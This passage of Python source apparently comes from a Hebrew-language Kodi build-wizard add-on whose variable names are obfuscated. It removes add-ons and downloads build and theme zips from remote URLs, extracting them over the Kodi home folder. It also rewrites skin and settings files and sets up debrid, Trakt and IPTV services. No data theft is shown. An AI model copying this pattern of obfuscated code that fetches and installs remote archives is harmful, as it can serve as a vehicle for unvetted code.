		xbmc .sleep (4000 )#line:3869
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.language","value":"resource.language.he_il"}}')#line:3870
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')#line:3871
		fixfont ()#line:3872
		O00OO00OO00OOOOOO =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:3873
		try :#line:3874
			OOOO000OO0OOOO000 =open (O00OO00OO00OOOOOO ,'r')#line:3875
			O00O0O0OOOO0O00O0 =OOOO000OO0OOOO000 .read ()#line:3876
			OOOO000OO0OOOO000 .close ()#line:3877
			O0OOO0OO0O00O00O0 ='<import addon="xbmc.gui" version="5.12.0(.+?)/>'#line:3878
			O0000O00O00O0000O =re .compile (O0OOO0OO0O00O00O0 ).findall (O00O0O0OOOO0O00O0 )[0 ]#line:3879
			OOOO000OO0OOOO000 =open (O00OO00OO00OOOOOO ,'w')#line:3880
			OOOO000OO0OOOO000 .write (O00O0O0OOOO0O00O0 .replace ('<import addon="xbmc.gui" version="5.12.0%s/>'%O0000O00O00O0000O ,'<import addon="xbmc.gui" version="5.14.0"/>'))#line:3881
			OOOO000OO0OOOO000 .close ()#line:3882
		except :#line:3883
				pass #line:3884
		wiz .kodi17Fix ()#line:3885
		O00OO00OO00OOOOOO =os .path .join (xbmc .translatePath ("special://userdata"),"guisettings.xml")#line:3886
		try :#line:3887
			OOOO000OO0OOOO000 =open (O00OO00OO00OOOOOO ,'r')#line:3888
			O00O0O0OOOO0O00O0 =OOOO000OO0OOOO000 .read ()#line:3889
			OOOO000OO0OOOO000 .close ()#line:3890
			O0OOO0OO0O00O00O0 ='<setting id="locale.keyboardlayouts" default="true(.+?)/setting>'#line:3891
			O0000O00O00O0000O =re .compile (O0OOO0OO0O00O00O0 ).findall (O00O0O0OOOO0O00O0 )[0 ]#line:3892
			OOOO000OO0OOOO000 =open (O00OO00OO00OOOOOO ,'w')#line:3893
			OOOO000OO0OOOO000 .write (O00O0O0OOOO0O00O0 .replace ('<setting id="locale.keyboardlayouts" default="true%s/setting>'%O0000O00O00O0000O ,'<setting id="locale.keyboardlayouts">English QWERTY|Hebrew QWERTY</setting>'))#line:3894
			OOOO000OO0OOOO000 .close ()#line:3895
		except :#line:3896
				pass #line:3897
		swapSkins ('skin.Premium.mod')#line:3898
def buildWizard (OO000000OOO0OO00O ,OO0000O0O0000OO0O ,theme =None ,over =False ):#line:3901
	if over ==False :#line:3902
		O0OO00OOOOO00O0OO =wiz .checkBuild (OO000000OOO0OO00O ,'url')#line:3903
		if O0OO00OOOOO00O0OO ==False :#line:3905
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]אנא המתן...[/COLOR]'%COLOR2 )#line:3910
			xbmc .executebuiltin ("RunPlugin(plugin://plugin.program.Anonymous/?mode=install&name=+Kodi+Premium&url=gui)")#line:3911
			return #line:3912
		O0O0000OO0OOO00O0 =wiz .workingURL (O0OO00OOOOO00O0OO )#line:3913
		if O0O0000OO0OOO00O0 ==False :#line:3914
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Build Zip Error: %s[/COLOR]"%(COLOR2 ,O0O0000OO0OOO00O0 ))#line:3915
			return #line:3916
	if OO0000O0O0000OO0O =='gui':#line:3917
		if OO000000OOO0OO00O ==BUILDNAME :#line:3918
			if over ==True :O000O0O00OO0O000O =1 #line:3919
			else :O000O0O00OO0O000O =1 #line:3920
		else :#line:3921
			O000O0O00OO0O000O =1 #line:3922
		if O000O0O00OO0O000O :#line:3923
			remove_addons ()#line:3924
			remove_addons2 ()#line:3925
			OOOOOOO0O0O00OOO0 =wiz .checkBuild (OO000000OOO0OO00O ,'gui')#line:3926
			OO0O0000000O0O0O0 =OO000000OOO0OO00O .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:3927
			if not wiz .workingURL (OOOOOOO0O0O00OOO0 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:3928
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3929
			DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO000000OOO0OO00O ),'','אנא המתן')#line:3930
			OOO00O0O000O00O00 =os .path .join (PACKAGES ,'%s_guisettings.zip'%OO0O0000000O0O0O0 )#line:3931
			try :os .remove (OOO00O0O000O00O00 )#line:3932
			except :pass #line:3933
			logging .warning (OOOOOOO0O0O00OOO0 )#line:3934
			if 'google'in OOOOOOO0O0O00OOO0 :#line:3935
			   OO00O00O00O00OO0O =googledrive_download (OOOOOOO0O0O00OOO0 ,OOO00O0O000O00O00 ,DP ,wiz .checkBuild (OO000000OOO0OO00O ,'filesize'))#line:3936
			else :#line:3939
			  downloader .download (OOOOOOO0O0O00OOO0 ,OOO00O0O000O00O00 ,DP )#line:3940
			xbmc .sleep (100 )#line:3941
			OOO000O000O00OOOO ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO000000OOO0OO00O )#line:3942
			DP .update (0 ,OOO000O000O00OOOO ,'','אנא המתן')#line:3943
			extract .all (OOO00O0O000O00O00 ,HOME ,DP ,title =OOO000O000O00OOOO )#line:3944
			DP .close ()#line:3945
			wiz .defaultSkin ()#line:3946
			wiz .lookandFeelData ('save')#line:3947
			wiz .kodi17Fix ()#line:3948
			if KODIV >=18 :#line:3949
				skindialogsettind18 ()#line:3950
			xbmc .executebuiltin ("ReloadSkin()")#line:3951
			if INSTALLMETHOD ==1 :OO00O0000O0000000 =1 #line:3952
			elif INSTALLMETHOD ==2 :OO00O0000O0000000 =0 #line:3953
			else :DP .close ()#line:3954
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הבילד עודכן בהצלחה![/COLOR]'%COLOR2 )#line:3955
			update_Votes ()#line:3956
			indicatorfastupdate ()#line:3957
		else :#line:3959
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Cancelled![/COLOR]'%COLOR2 )#line:3960
	if OO0000O0O0000OO0O =='gui2':#line:3961
		if OO000000OOO0OO00O ==BUILDNAME :#line:3962
			if over ==True :O000O0O00OO0O000O =1 #line:3963
			else :O000O0O00OO0O000O =1 #line:3964
		else :#line:3965
			O000O0O00OO0O000O =1 #line:3966
		if O000O0O00OO0O000O :#line:3967
			remove_addons ()#line:3968
			remove_addons2 ()#line:3969
			OOOOOOO0O0O00OOO0 =wiz .checkBuild (OO000000OOO0OO00O ,'gui')#line:3970
			OO0O0000000O0O0O0 =OO000000OOO0OO00O .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:3971
			if not wiz .workingURL (OOOOOOO0O0O00OOO0 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:3972
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3973
			DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO000000OOO0OO00O ),'','אנא המתן')#line:3974
			OOO00O0O000O00O00 =os .path .join (PACKAGES ,'%s_guisettings.zip'%OO0O0000000O0O0O0 )#line:3975
			try :os .remove (OOO00O0O000O00O00 )#line:3976
			except :pass #line:3977
			logging .warning (OOOOOOO0O0O00OOO0 )#line:3978
			if 'google'in OOOOOOO0O0O00OOO0 :#line:3979
			   OO00O00O00O00OO0O =googledrive_download (OOOOOOO0O0O00OOO0 ,OOO00O0O000O00O00 ,DP ,wiz .checkBuild (OO000000OOO0OO00O ,'filesize'))#line:3980
			else :#line:3983
			  downloader .download (OOOOOOO0O0O00OOO0 ,OOO00O0O000O00O00 ,DP )#line:3984
			xbmc .sleep (100 )#line:3985
			OOO000O000O00OOOO ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO000000OOO0OO00O )#line:3986
			DP .update (0 ,OOO000O000O00OOOO ,'','אנא המתן')#line:3987
			extract .all (OOO00O0O000O00O00 ,HOME ,DP ,title =OOO000O000O00OOOO )#line:3988
			DP .close ()#line:3989
			wiz .defaultSkin ()#line:3990
			wiz .lookandFeelData ('save')#line:3991
			if INSTALLMETHOD ==1 :OO00O0000O0000000 =1 #line:3994
			elif INSTALLMETHOD ==2 :OO00O0000O0000000 =0 #line:3995
			else :DP .close ()#line:3996
		else :#line:3998
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Cancelled![/COLOR]'%COLOR2 )#line:3999
	elif OO0000O0O0000OO0O =='fresh':#line:4000
		freshStart (OO000000OOO0OO00O )#line:4001
	elif OO0000O0O0000OO0O =='normal':#line:4002
		if url =='normal':#line:4003
			if KEEPTRAKT =='true':#line:4004
				traktit .autoUpdate ('all')#line:4005
				wiz .setS ('traktlastsave',str (THREEDAYS ))#line:4006
			if KEEPREAL =='true':#line:4007
				debridit .autoUpdate ('all')#line:4008
				wiz .setS ('debridlastsave',str (THREEDAYS ))#line:4009
			if KEEPLOGIN =='true':#line:4010
				loginit .autoUpdate ('all')#line:4011
				wiz .setS ('loginlastsave',str (THREEDAYS ))#line:4012
		OOO0000O0O000O00O =int (KODIV );O000OOOOO00O0OOOO =int (float (wiz .checkBuild (OO000000OOO0OO00O ,'kodi')))#line:4013
		if not OOO0000O0O000O00O ==O000OOOOO00O0OOOO :#line:4014
			if OOO0000O0O000O00O ==16 and O000OOOOO00O0OOOO <=15 :O000O0O00O0OOOOOO =False #line:4015
			else :O000O0O00O0OOOOOO =True #line:4016
		else :O000O0O00O0OOOOOO =False #line:4017
		if O000O0O00O0OOOOOO ==True :#line:4018
			O0OO0O000OOOOOOOO =1 #line:4019
		else :#line:4020
			if not over ==False :O0OO0O000OOOOOOOO =1 #line:4021
			else :O0OO0O000OOOOOOOO =DIALOG .yesno (ADDONTITLE ,'התקנה רגילה:','מצב זה שומר הרחבות קיימות, האם להמשיך?',nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4022
		if O0OO0O000OOOOOOOO :#line:4023
			wiz .clearS ('build')#line:4024
			OOOOOOO0O0O00OOO0 =wiz .checkBuild (OO000000OOO0OO00O ,'url')#line:4025
			OO0O0000000O0O0O0 =OO000000OOO0OO00O .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4026
			if not wiz .workingURL (OOOOOOO0O0O00OOO0 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Build Install: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:4027
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4028
			DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s v%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO000000OOO0OO00O ,wiz .checkBuild (OO000000OOO0OO00O ,'version')),'','אנא המתן')#line:4029
			OOO00O0O000O00O00 =os .path .join (PACKAGES ,'%s.zip'%OO0O0000000O0O0O0 )#line:4030
			try :os .remove (OOO00O0O000O00O00 )#line:4031
			except :pass #line:4032
			logging .warning (OOOOOOO0O0O00OOO0 )#line:4033
			if 'google'in OOOOOOO0O0O00OOO0 :#line:4034
			   OO00O00O00O00OO0O =googledrive_download (OOOOOOO0O0O00OOO0 ,OOO00O0O000O00O00 ,DP ,wiz .checkBuild (OO000000OOO0OO00O ,'filesize'))#line:4035
			else :#line:4038
			  downloader .download (OOOOOOO0O0O00OOO0 ,OOO00O0O000O00O00 ,DP )#line:4039
			xbmc .sleep (1000 )#line:4040
			OOO000O000O00OOOO ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s v%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO000000OOO0OO00O ,wiz .checkBuild (OO000000OOO0OO00O ,'version'))#line:4041
			DP .update (0 ,OOO000O000O00OOOO ,'','Please Wait')#line:4042
			OOO000OO0O00O0O00 ,O0OO0O000OO00000O ,OOOO000000000OO00 =extract .all (OOO00O0O000O00O00 ,HOME ,DP ,title =OOO000O000O00OOOO )#line:4043
			if int (float (OOO000OO0O00O0O00 ))>0 :#line:4044
				try :#line:4045
					wiz .fixmetas ()#line:4046
				except :pass #line:4047
				wiz .lookandFeelData ('save')#line:4048
				wiz .defaultSkin ()#line:4049
				wiz .setS ('buildname',OO000000OOO0OO00O )#line:4051
				wiz .setS ('buildversion',wiz .checkBuild (OO000000OOO0OO00O ,'version'))#line:4052
				wiz .setS ('buildtheme','')#line:4053
				wiz .setS ('latestversion',wiz .checkBuild (OO000000OOO0OO00O ,'version'))#line:4054
				wiz .setS ('lastbuildcheck',str (NEXTCHECK ))#line:4055
				wiz .setS ('installed','true')#line:4056
				wiz .setS ('extract',str (OOO000OO0O00O0O00 ))#line:4057
				wiz .setS ('errors',str (O0OO0O000OO00000O ))#line:4058
				wiz .log ('INSTALLED %s: [ERRORS:%s]'%(OOO000OO0O00O0O00 ,O0OO0O000OO00000O ))#line:4059
				fastupdatefirstbuild (NOTEID )#line:4060
				wiz .kodi17Fix ()#line:4061
				skin_homeselect ()#line:4062
				skin_lower ()#line:4063
				rdbuildinstall ()#line:4064
				try :gaiaserenaddon ()#line:4065
				except :pass #line:4066
				adults18 ()#line:4067
				skinfix18 ()#line:4068
				try :os .remove (OOO00O0O000O00O00 )#line:4070
				except :pass #line:4071
				OO0O000OO0OOO0OOO =(ADDON .getSetting ("auto_rd"))#line:4072
				if OO0O000OO0OOO0OOO =='true':#line:4073
					try :#line:4074
						setautorealdebrid ()#line:4075
					except :pass #line:4076
				try :#line:4077
					autotrakt ()#line:4078
				except :pass #line:4079
				OO0O00OO0O0O0OO00 =(ADDON .getSetting ("imdb_on"))#line:4080
				if OO0O00OO0O0O0OO00 =='true':#line:4081
					imdb_synck ()#line:4082
				iptvset ()#line:4083
				if int (float (O0OO0O000OO00000O ))>0 :#line:4085
					O000O0O00OO0O000O =DIALOG .yesno (ADDONTITLE ,'[COLOR %s][COLOR %s]%s v%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO000000OOO0OO00O ,wiz .checkBuild (OO000000OOO0OO00O ,'version')),'הושלם: [COLOR %s]%s%s[/COLOR] [שגיאות:[COLOR %s]%s[/COLOR]]'%(COLOR1 ,OOO000OO0O00O0O00 ,'%',COLOR1 ,O0OO0O000OO00000O ),'האם תרצה להציג שגיאות?[/COLOR]',nolabel ='[B][COLOR red]לא תודה[/COLOR][/B]',yeslabel ='[B][COLOR green]הצג שגיאות[/COLOR][/B]')#line:4086
					if O000O0O00OO0O000O :#line:4087
						if isinstance (O0OO0O000OO00000O ,unicode ):#line:4088
							OOOO000000000OO00 =OOOO000000000OO00 .encode ('utf-8')#line:4089
						wiz .TextBox (ADDONTITLE ,OOOO000000000OO00 )#line:4090
				DP .close ()#line:4091
				O0O00O0000O00O0O0 =wiz .themeCount (OO000000OOO0OO00O )#line:4092
				builde_Votes ()#line:4093
				indicator ()#line:4094
				if not O0O00O0000O00O0O0 ==False :#line:4095
					buildWizard (OO000000OOO0OO00O ,'theme')#line:4096
				if KODIV >=17 :wiz .addonDatabase (ADDON_ID ,1 )#line:4097
				if INSTALLMETHOD ==1 :OO00O0000O0000000 =1 #line:4098
				elif INSTALLMETHOD ==2 :OO00O0000O0000000 =0 #line:4099
				else :resetkodi ()#line:4100
				if OO00O0000O0000000 ==1 :wiz .reloadFix ()#line:4102
				else :wiz .killxbmc (True )#line:4103
			else :#line:4104
				if isinstance (O0OO0O000OO00000O ,unicode ):#line:4105
					OOOO000000000OO00 =OOOO000000000OO00 .encode ('utf-8')#line:4106
				OOO0OOO0O0OO00OO0 =open (OOO00O0O000O00O00 ,'r')#line:4107
				O000O0O0O000OO0OO =OOO0OOO0O0OO00OO0 .read ()#line:4108
				OO0OOO00O0000000O =''#line:4109
				for OOOO00O00OOOOOO0O in OO00O00O00O00OO0O :#line:4110
				  OO0OOO00O0000000O ='key: '+OO0OOO00O0000000O +'\n'+OOOO00O00OOOOOO0O #line:4111
				wiz .TextBox ("%s: בעיה בהתקנת הבילד"%ADDONTITLE ,OOOO000000000OO00 +'לפתרון הבעיה יש לשנות את התאריך במכשיר ליום אחד קודם.'+OO0OOO00O0000000O )#line:4112
		else :#line:4113
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנת הבילד: מבוטלת![/COLOR]'%COLOR2 )#line:4114
	elif OO0000O0O0000OO0O =='theme':#line:4115
		if theme ==None :#line:4116
			O0O00O0000O00O0O0 =wiz .checkBuild (OO000000OOO0OO00O ,'theme')#line:4117
			OO00OOO00O0OOOO00 =[]#line:4118
			if not O0O00O0000O00O0O0 =='http://'and wiz .workingURL (O0O00O0000O00O0O0 )==True :#line:4119
				OO00OOO00O0OOOO00 =wiz .themeCount (OO000000OOO0OO00O ,False )#line:4120
				if len (OO00OOO00O0OOOO00 )>0 :#line:4121
					if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]The Build [COLOR %s]%s[/COLOR] comes with [COLOR %s]%s[/COLOR] different themes"%(COLOR2 ,COLOR1 ,OO000000OOO0OO00O ,COLOR1 ,len (OO00OOO00O0OOOO00 )),"Would you like to install one now?[/COLOR]",yeslabel ="[B][COLOR green]Install Theme[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel Themes[/COLOR][/B]"):#line:4122
						wiz .log ("Theme List: %s "%str (OO00OOO00O0OOOO00 ))#line:4123
						OO000000OOOO00OO0 =DIALOG .select (ADDONTITLE ,OO00OOO00O0OOOO00 )#line:4124
						wiz .log ("Theme install selected: %s"%OO000000OOOO00OO0 )#line:4125
						if not OO000000OOOO00OO0 ==-1 :theme =OO00OOO00O0OOOO00 [OO000000OOOO00OO0 ];O0O000O0O0OOO0O00 =True #line:4126
						else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 );return #line:4127
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 );return #line:4128
			else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: None Found![/COLOR]'%COLOR2 )#line:4129
		else :O0O000O0O0OOO0O00 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to install the theme:'%COLOR2 ,'[COLOR %s]%s[/COLOR]'%(COLOR1 ,theme ),'for [COLOR %s]%s v%s[/COLOR]?[/COLOR]'%(COLOR1 ,OO000000OOO0OO00O ,wiz .checkBuild (OO000000OOO0OO00O ,'version')),yeslabel ="[B][COLOR green]Install Theme[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel Themes[/COLOR][/B]")#line:4130
		if O0O000O0O0OOO0O00 :#line:4131
			OOOO000OOOOOOO0OO =wiz .checkTheme (OO000000OOO0OO00O ,theme ,'url')#line:4132
			OO0O0000000O0O0O0 =OO000000OOO0OO00O .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4133
			if not wiz .workingURL (OOOO000OOOOOOO0OO )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Invalid Zip Url![/COLOR]'%COLOR2 );return False #line:4134
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4135
			DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,theme ),'','Please Wait')#line:4136
			OOO00O0O000O00O00 =os .path .join (PACKAGES ,'%s.zip'%OO0O0000000O0O0O0 )#line:4137
			try :os .remove (OOO00O0O000O00O00 )#line:4138
			except :pass #line:4139
			downloader .download (OOOO000OOOOOOO0OO ,OOO00O0O000O00O00 ,DP )#line:4140
			xbmc .sleep (1000 )#line:4141
			DP .update (0 ,"","Installing %s "%OO000000OOO0OO00O )#line:4142
			O00OOO00000OOOOO0 =False #line:4143
			if url not in ["fresh","normal"]:#line:4144
				O00OOO00000OOOOO0 =testTheme (OOO00O0O000O00O00 )if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']else False #line:4145
				O00OOO000OO000OO0 =testGui (OOO00O0O000O00O00 )if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']else False #line:4146
				if O00OOO00000OOOOO0 ==True :#line:4147
					wiz .lookandFeelData ('save')#line:4148
					O0OOO0000OO000OOO ='skin.confluence'if KODIV <17 else 'skin.estuary'if KODIV <17 else 'skin.anonymous.mod'if KODIV <17 else 'skin.estouchy'if KODIV <17 else 'skin.phenomenal'if KODIV <17 else 'skin.anonymous.nox'if KODIV <17 else 'skin.Premium.mod'#line:4149
					OOOO0OO0O0O00O000 =xbmc .getSkinDir ()#line:4150
					skinSwitch .swapSkins (O0OOO0000OO000OOO )#line:4152
					O0000O00OOOOO0000 =0 #line:4153
					xbmc .sleep (1000 )#line:4154
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O0000O00OOOOO0000 <150 :#line:4155
						O0000O00OOOOO0000 +=1 #line:4156
						xbmc .sleep (1000 )#line:4157
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4158
						wiz .ebi ('SendClick(11)')#line:4159
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Skin Swap Timed Out![/COLOR]'%COLOR2 );return #line:4160
					xbmc .sleep (1000 )#line:4161
			OOO000O000O00OOOO ='[COLOR %s][B]Installing Theme:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,theme )#line:4162
			DP .update (0 ,OOO000O000O00OOOO ,'','אנא המתן')#line:4163
			OOO000OO0O00O0O00 ,O0OO0O000OO00000O ,OOOO000000000OO00 =extract .all (OOO00O0O000O00O00 ,HOME ,DP ,title =OOO000O000O00OOOO )#line:4164
			wiz .setS ('buildtheme',theme )#line:4165
			wiz .log ('INSTALLED %s: [שגיאות:%s]'%(OOO000OO0O00O0O00 ,O0OO0O000OO00000O ))#line:4166
			DP .close ()#line:4167
			if url not in ["fresh","normal"]:#line:4168
				wiz .forceUpdate ()#line:4169
				if KODIV >=17 :wiz .kodi17Fix ()#line:4170
				if O00OOO000OO000OO0 ==True :#line:4171
					wiz .lookandFeelData ('save')#line:4172
					wiz .defaultSkin ()#line:4173
					OOOO0OO0O0O00O000 =wiz .getS ('defaultskin')#line:4174
					skinSwitch .swapSkins (OOOO0OO0O0O00O000 )#line:4175
					O0000O00OOOOO0000 =0 #line:4176
					xbmc .sleep (1000 )#line:4177
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O0000O00OOOOO0000 <150 :#line:4178
						O0000O00OOOOO0000 +=1 #line:4179
						xbmc .sleep (1000 )#line:4180
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4182
						wiz .ebi ('SendClick(11)')#line:4183
					wiz .lookandFeelData ('restore')#line:4184
				elif O00OOO00000OOOOO0 ==True :#line:4185
					skinSwitch .swapSkins (OOOO0OO0O0O00O000 )#line:4186
					O0000O00OOOOO0000 =0 #line:4187
					xbmc .sleep (1000 )#line:4188
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O0000O00OOOOO0000 <150 :#line:4189
						O0000O00OOOOO0000 +=1 #line:4190
						xbmc .sleep (1000 )#line:4191
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4193
						wiz .ebi ('SendClick(11)')#line:4194
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Skin Swap Timed Out![/COLOR]'%COLOR2 );return #line:4195
					wiz .lookandFeelData ('restore')#line:4196
				else :#line:4197
					wiz .ebi ("ReloadSkin()")#line:4198
					xbmc .sleep (1000 )#line:4199
					wiz .ebi ("Container.Refresh")#line:4200
		else :#line:4201
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 )#line:4202
def skin_homeselect ():#line:4206
	try :#line:4208
		OOOOO0OO0O00OO00O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4209
		OO0O0OOOOO0O0OO0O =open (OOOOO0OO0O00OO00O ,'r')#line:4211
		O0OO0000O00OO0O00 =OO0O0OOOOO0O0OO0O .read ()#line:4212
		OO0O0OOOOO0O0OO0O .close ()#line:4213
		O00OO000000000OOO ='<setting id="HomeS" type="string(.+?)/setting>'#line:4214
		OO0O00000O0O000O0 =re .compile (O00OO000000000OOO ).findall (O0OO0000O00OO0O00 )[0 ]#line:4215
		OO0O0OOOOO0O0OO0O =open (OOOOO0OO0O00OO00O ,'w')#line:4216
		OO0O0OOOOO0O0OO0O .write (O0OO0000O00OO0O00 .replace ('<setting id="HomeS" type="string%s/setting>'%OO0O00000O0O000O0 ,'<setting id="HomeS" type="string"></setting>'))#line:4217
		OO0O0OOOOO0O0OO0O .close ()#line:4218
	except :#line:4219
		pass #line:4220
def skin_lower ():#line:4223
	O0OOOOO00O00OO000 =(ADDON .getSetting ("lower"))#line:4224
	if O0OOOOO00O00OO000 =='true':#line:4225
		try :#line:4228
			OOOOO0OO0OO00O00O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4229
			OOOOOO0OOO00OO00O =open (OOOOO0OO0OO00O00O ,'r')#line:4231
			OO0000OOOO00O00O0 =OOOOOO0OOO00OO00O .read ()#line:4232
			OOOOOO0OOO00OO00O .close ()#line:4233
			O00OO00OOO0OO00O0 ='<setting id="none_widget" type="bool(.+?)/setting>'#line:4234
			O0000OO0OOOO00OOO =re .compile (O00OO00OOO0OO00O0 ).findall (OO0000OOOO00O00O0 )[0 ]#line:4235
			OOOOOO0OOO00OO00O =open (OOOOO0OO0OO00O00O ,'w')#line:4236
			OOOOOO0OOO00OO00O .write (OO0000OOOO00O00O0 .replace ('<setting id="none_widget" type="bool%s/setting>'%O0000OO0OOOO00OOO ,'<setting id="none_widget" type="bool">true</setting>'))#line:4237
			OOOOOO0OOO00OO00O .close ()#line:4238
			OOOOO0OO0OO00O00O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4240
			OOOOOO0OOO00OO00O =open (OOOOO0OO0OO00O00O ,'r')#line:4242
			OO0000OOOO00O00O0 =OOOOOO0OOO00OO00O .read ()#line:4243
			OOOOOO0OOO00OO00O .close ()#line:4244
			O00OO00OOO0OO00O0 ='<setting id="DisableOverlayColor" type="bool(.+?)/setting>'#line:4245
			O0000OO0OOOO00OOO =re .compile (O00OO00OOO0OO00O0 ).findall (OO0000OOOO00O00O0 )[0 ]#line:4246
			OOOOOO0OOO00OO00O =open (OOOOO0OO0OO00O00O ,'w')#line:4247
			OOOOOO0OOO00OO00O .write (OO0000OOOO00O00O0 .replace ('<setting id="DisableOverlayColor" type="bool%s/setting>'%O0000OO0OOOO00OOO ,'<setting id="DisableOverlayColor" type="bool">true</setting>'))#line:4248
			OOOOOO0OOO00OO00O .close ()#line:4249
			OOOOO0OO0OO00O00O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4251
			OOOOOO0OOO00OO00O =open (OOOOO0OO0OO00O00O ,'r')#line:4253
			OO0000OOOO00O00O0 =OOOOOO0OOO00OO00O .read ()#line:4254
			OOOOOO0OOO00OO00O .close ()#line:4255
			O00OO00OOO0OO00O0 ='<setting id="backgroundwallpaper" type="bool(.+?)/setting>'#line:4256
			O0000OO0OOOO00OOO =re .compile (O00OO00OOO0OO00O0 ).findall (OO0000OOOO00O00O0 )[0 ]#line:4257
			OOOOOO0OOO00OO00O =open (OOOOO0OO0OO00O00O ,'w')#line:4258
			OOOOOO0OOO00OO00O .write (OO0000OOOO00O00O0 .replace ('<setting id="backgroundwallpaper" type="bool%s/setting>'%O0000OO0OOOO00OOO ,'<setting id="backgroundwallpaper" type="bool">true</setting>'))#line:4259
			OOOOOO0OOO00OO00O .close ()#line:4260
